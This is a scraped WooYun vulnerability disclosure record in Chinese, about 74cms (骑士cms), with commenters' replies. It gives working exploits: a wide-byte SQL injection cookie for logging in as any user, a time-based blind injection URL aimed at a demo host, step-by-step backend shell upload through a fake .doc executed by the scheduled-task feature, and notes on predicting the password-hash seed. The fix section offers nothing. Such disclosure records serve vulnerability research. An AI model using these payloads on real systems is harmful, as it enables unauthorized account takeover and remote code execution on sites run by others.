{"id": 19579, "wybug_id": "wooyun-2012-08414", "wybug_title": "骑士cms注入，后台拿shell", "wybug_corp": "74c,s.com", "wybug_author": "yy520", "wybug_date": "2012-06-18 11:47", "wybug_open_date": "2012-06-23 11:48", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当导致攻击界面扩大", "认证缺陷", "认证设计不合理", "逻辑错误", "字符类型注射", "代码执行", "字符集", "字符集导致"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 0x1 任意用户登录0x2 盲注0x3 后台拿shell0x4 随机函数问题 详细说明：  0x1 任意用户登录user/login.php\nelseif((empty($_SESSION['uid']) || empty($_SESSION['username']) || empty($_SESSION['utype'])) &&  $_COOKIE['QS']['username'] && $_COOKIE['QS']['password'] && $_COOKIE['QS']['uid']){\tif(check_cookie($_COOKIE['QS']['username'],$_COOKIE['QS']['password']))\t{\tupdate_user_info($_COOKIE['QS']['uid'],false,false);\theader(\"Location:\".get_member_url($_SESSION['utype']));\t}\telse\t{\tunset($_SESSION['uid'],$_SESSION['username'],$_SESSION['utype'],$_SESSION['uqqid'],$_SESSION['activate_username'],$_SESSION['activate_email'],$_SESSION[\"openid\"]);\tsetcookie(\"QS[uid]\",\"\",time() - 3600,$QS_cookiepath, $QS_cookiedomain);\tsetcookie('QS[username]',\"\", time() - 3600,$QS_cookiepath, $QS_cookiedomain);\tsetcookie('QS[password]',\"\", time() - 3600,$QS_cookiepath, $QS_cookiedomain);\tsetcookie(\"QS[utype]\",\"\",time() - 3600,$QS_cookiepath, $QS_cookiedomain);\theader(\"Location:\".url_rewrite('QS_login'));\t}}\ninclude/fun_user.php\n//检测COOKIEfunction check_cookie($name,$pwd){ \tglobal $db; \t$row = $db->getone(\"SELECT COUNT(*) AS num FROM \".table('members').\" WHERE username='{$name}' and password = '{$pwd}'\"); \tif($row['num'] > 0)\t{ \treturn true; \t}else{ \treturn false; \t} }\n构造cookie如下QS[uid]\t        2QS[utype]\t1QS[password]\t111111111111111111111QS[username]\t%bf%27 or 1=1 %23uid 为假冒用户的ID utype为用户类型 password任意0x2 盲注http://demo32.74cms.com//resume/resume-list.php?key=test00%bf')/**/and+if((select/**/admin_name/**/from/**/qs_admin/**/limit/**/0,1)=0x61646D696E,benchmark(1000000000,(select/**/1)),1)/**/%23上面两个都是宽字节注入,如果你能猜出管理员密码，还能解出双重md5的话，还能猜出后台路径，继续看下面0x3 后台拿shell1.先关闭csrf防御功能2.在hr工具箱中添加一个伪造的doc，内容为<?php phpinfo();?>，记下路径data/hrtools/2012/06/1339941553308.doc3.在工具-计划任务中添加任务，脚本任务填../../data/hrtools/2012/06/1339941553308.doc4.然后执行0x4 随机函数问题(几乎可以无视，纯属个人YY)在admin_common.fun.inc.php中有个$QS_pwdhash是在安装的时候赋值的，只要能猜出就可已不用解双重md5了。这个$QS_pwdhash是由randstr生成\nfunction randstr($length=6){$hash='';$chars= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz@#!~?:-=';   $max=strlen($chars)-1;   mt_srand((double)microtime()*1000000);   for($i=0;$i<$length;$i++)   {   $hash.=$chars[mt_rand(0,$max)];   }   return $hash;   }\n生成长度为6的随机数，mt_srand()播种一样，就会得到一样的随机数，所以我们最多要猜1000000次就可以了（蛋疼）   漏洞证明：  \n\n\n\n   修复方案：  do it yourself~   版权声明：转载请注明来源 yy520@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-06-23 11:48 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-18 15:15 |    \t\t坏虾 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | From Internet,For Internet……BY：坏虾)\t\t \n  占沙发围观~    \n     2012-06-18 15:18 |    \t\tWdot \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:12        | it came too later)\t\t \n  坐等厂商忽略    \n     2012-06-18 15:21 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  @Wdot 无奈啊~ 我提交漏洞了才发现我前两个利用方法和你的差不多，到了3.2厂商都没补，唉~~~~~~~~~~~    \n     2012-06-19 20:10 |    \t\tWdot \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:12        | it came too later)\t\t \n  @yy520 你为什么会有30分呢    \n     2012-06-19 22:45 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  @Wdot 其实我也不懂～～    \n     2012-06-23 15:06 |    \t\tWdot \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:12        | it came too later)\t\t \n  @yy520 我就说了，厂商会忽略的～    \n     2012-06-25 17:22 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  碉堡~    \n     2013-09-26 17:14 |    \t\tEvi1m0 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 邪红色信息安全组织)\t\t \n  哦呵呵呵呵呵呵呵    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}